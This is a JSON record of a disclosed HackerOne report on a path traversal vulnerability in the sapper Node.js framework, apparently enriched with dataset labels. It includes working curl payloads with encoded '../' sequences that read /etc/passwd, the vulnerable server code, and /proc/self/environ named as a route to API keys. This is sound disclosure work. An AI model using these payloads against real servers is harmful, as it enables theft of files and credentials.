{
  "reported_to": "Node.js third-party modules",
  "reported_by": "anvikha ",
  "title": "[sapper] Path Traversal",
  "content": "\nI would like to report a critical path traversal vunerability in the sapper module\nIt allows an attacker to simply obain arbitrary files from the remote server, exploiting a simple path traversal using URL-encoded \"../\".\nModule\nmodule name: sapper\nversion: 0.27.10\nnpm page: https://www.npmjs.com/package/sapper\nModule Description\nSapper is a framework for building high-performance universal web apps. Read the guide or the introductory blog post to learn more.\nModule Stats\n[6,762] weekly downloads\nVulnerability\nVulnerability Description\nThe vulnerability was found by playing with a sapper / webpack stack while researching vulnerabilities on internal projects.\nI started to dig deeper on how static files were served, and I've noticed that the module allowed a trivial path traversal in its code.\nSteps To Reproduce:\nClone https://github.com/sveltejs/sapper-template project\nnpm i\nUse degit to obtain the webpack example app: npx degit \"sveltejs/sapper-template#webpack\" my-app\nnpx sapper dev - exploit with curl -vv http://localhost:3000/client/750af05c3a69ddc6073a/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd This also works in prod mode with\nnpx sapper build && node __sapper__build - exploit with curl -vvv http://localhost:3000/client/750af05c3a69ddc6073a/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd\nThe reason why the production deployment requires an extra-layer of URL encoding is because this project runs under polka in production, which, contrary to express for example, applies an extra decodeURIComponent on the URI.\nPatch\nSapper server simply forms a path with path.resolve using the build_dir as base directory and the URI-decoded file passed in the URL, resulting in a path traversal.\nI am not providing a patch here, but here I've identified the vulnerable code:\nsapper/runtime/server.mjs\nCode 702 Bytes\n1function serve({ prefix, pathname, cache_control }\n2\n3\n4\n5) {\n6  const filter = pathname\n7    ? (req) => req.path === pathname\n8    : (req) => req.path.startsWith(prefix);\n9\n10  const cache = new Map();\n11\n12  const read = dev\n13    ? (file) => fs.readFileSync(path.resolve(build_dir, file))\n14    : (file) => (cache.has(file) ? cache : cache.set(file, fs.readFileSync(path.resolve(build_dir, file)))).get(file);\n15\n16  return (req, res, next) => {\n17    if (filter(req)) {\n18    const type = lookup(req.path);\n19\n20    try {\n21      const file = decodeURIComponent(req.path.slice(1));\n22      const data = read(file);\n23\n24      res.setHeader('Content-Type', type);\n25      res.setHeader('Cache-Control', cache_control);\n26      res.end(data);\nSupporting Material/References:\nOS: Debian Linux sid\nNodeJS: v10.19.0\nNPM: 6.13.4\nWrap up\nI contacted the maintainer to let them know: Y\nI opened an issue in the related repository: N - I think this is too severe and impacts too many sites to make it public.\n\nImpact\nAny file can be retrieved from the remote server, namely stuff like /proc/self/environ, which would contain any sort of API keys used by the environment the application has been deployed too. This will lead to complete infrastructure RCE and takeover.\n\n",
  "severity": [
    8.6,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Path Traversal"
  ],
  "screenshots": {},
  "disclosed_date": 1592527260,
  "report_url": "https://hackerone.com/reports/820224",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Clone the sapper-template project: https://github.com/sveltejs/sapper-template"
    ],
    [
      2,
      "Install dependencies and set up the webpack example app using: npx degit \"sveltejs/sapper-template#webpack\" my-app"
    ],
    [
      3,
      "Run the development server: npx sapper dev"
    ],
    [
      4,
      "Exploit the vulnerability by accessing: curl -vv http://localhost:3000/client/750af05c3a69ddc6073a/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
    ],
    [
      5,
      "For production mode, build and run: npx sapper build && node __sapper__build"
    ],
    [
      6,
      "Exploit in production with: curl -vvv http://localhost:3000/client/750af05c3a69ddc6073a/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd"
    ]
  ],
  "vuln_description": "The vulnerability is a path traversal issue in the sapper module, allowing an attacker to access arbitrary files on the remote server by exploiting URL-encoded \"../\" sequences. This can lead to unauthorized access to sensitive files like /etc/passwd or /proc/self/environ, potentially exposing API keys and other critical data.",
  "reason": "The vulnerability involves a straightforward path traversal attack using URL-encoded sequences, which is a well-known technique. The attack does not require complex interactions or state manipulation, and the vulnerable code is easily identifiable in the server's file handling logic.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}